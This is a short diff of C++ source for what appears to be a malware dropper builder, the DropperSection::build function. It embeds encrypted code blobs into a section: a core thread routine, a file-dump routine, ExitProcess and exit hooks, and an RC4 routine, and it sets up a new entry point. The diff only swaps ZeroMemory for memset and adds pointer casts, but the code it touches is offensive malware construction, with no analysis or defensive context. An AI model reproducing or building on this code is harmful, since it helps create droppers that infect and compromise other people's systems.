@@ -48,7 +48,7 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	char * ptr = _data;
 	
 	DataSectionHeader* header = (DataSectionHeader*)ptr;
-	ZeroMemory(header, sizeof(DataSectionHeader));
+	memset(header, 0, sizeof(DataSectionHeader));
 	ptr += sizeof(DataSectionHeader);
 	
 	// Generate ecryption key
@@ -151,11 +151,11 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	cout << "NewEntryPoint is " << newEPSize << " bytes long, offset " << newEP << endl;
 	
 	// CoreThreadProc code
-	ptr += _embedFunction(CoreThreadProc, CoreThreadProc_End, header->functions.coreThread, ptr);
+	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)CoreThreadProc_End, header->functions.coreThread, ptr);
 	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
 	
 	// DumpFile code
-	ptr += _embedFunction(DumpFile, DumpFile_End, header->functions.dumpFile, ptr);
+	ptr += _embedFunction((PVOID)DumpFile, (PVOID)DumpFile_End, header->functions.dumpFile, ptr);
 	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
 	
 	// ExitProcessHook data
@@ -169,15 +169,15 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	ptr += 4;	
 
 	// ExitProcessHook code
-	ptr += _embedFunction(ExitProcessHook, ExitProcessHook_End, header->functions.exitProcessHook, ptr);
+	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
 
 	// ExitHook code
-	ptr += _embedFunction(ExitHook, ExitHook_End, header->functions.exitHook, ptr);
+	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
 	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
 	
 	// RC4 code
-	ptr += _embedFunction(rc4_skip, rc4_skip_End, header->functions.rc4, ptr);
+	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 	
 	// compute total size
